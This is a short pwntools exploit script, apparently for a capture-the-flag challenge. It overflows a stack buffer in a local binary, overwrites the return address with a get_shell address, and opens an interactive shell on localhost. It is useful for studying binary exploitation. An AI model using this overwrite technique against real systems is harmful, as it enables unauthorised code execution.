#!/usr/bin/env python3

from pwn import *
from pwnlib.util.misc import run_in_new_terminal

binary = "./chall_patched"
elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = binary
p = process(binary)
p = remote("localhost", 1337)
context.log_level = 'debug' 

sleep(1)

pid = pidof('chall_patched')[0]

s = '''
b main
'''
run_in_new_terminal(f'gdb -p {pid} -ex "{s}"')


payload = flat(
    b'A' * 0x70, # up to rbp 
    b'B' * 0x8, # overwrite saved old rbp
    0x0000000000401182, # overwrite return address to get_shell
)


p.sendline(payload)
p.sendlineafter(b"End?[Y/N] ", b"Y")

p.interactive()

